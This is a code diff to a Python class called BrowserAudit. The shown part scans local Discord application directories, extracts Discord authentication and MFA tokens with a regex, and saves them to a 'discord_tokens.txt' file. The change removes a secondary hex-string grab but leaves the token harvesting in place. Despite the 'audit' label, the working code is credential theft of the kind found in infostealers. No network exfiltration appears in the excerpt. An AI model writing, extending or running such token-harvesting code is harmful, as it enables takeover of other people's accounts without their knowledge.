@@ -306,7 +306,6 @@ class BrowserAudit:
 
         found_any = False
         token_pattern = r'[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{27,}|mfa\.[a-zA-Z0-9_\-]{84,}'
-        hex_pattern = r'[a-f0-9]{32,}'
 
         for app_name, discord_dir in discord_dirs.items():
             if not discord_dir.exists():
@@ -327,22 +326,12 @@ class BrowserAudit:
                         with open(file, 'r', encoding='ISO-8859-1') as f:
                             content = f.read()
 
-                            # Extract all tokens from content
                             tokens = re.findall(token_pattern, content)
                             if tokens and self.cookies_dir:
                                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                     for token in set(tokens):
                                         out.write(f"[{app_name}] {token}\n")
                                         found_any = True
-
-                            # Extract hex/base64 data
-                            hex_candidates = re.findall(hex_pattern, content)
-                            if hex_candidates and self.cookies_dir:
-                                with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
-                                    for candidate in set(hex_candidates[:20]):
-                                        if len(candidate) > 20:
-                                            out.write(f"[{app_name}] {candidate}\n")
-                                            found_any = True
                     except PermissionError:
                         self.log("WARNING", f"Permission denied reading {file} - try with sudo")
                     except:
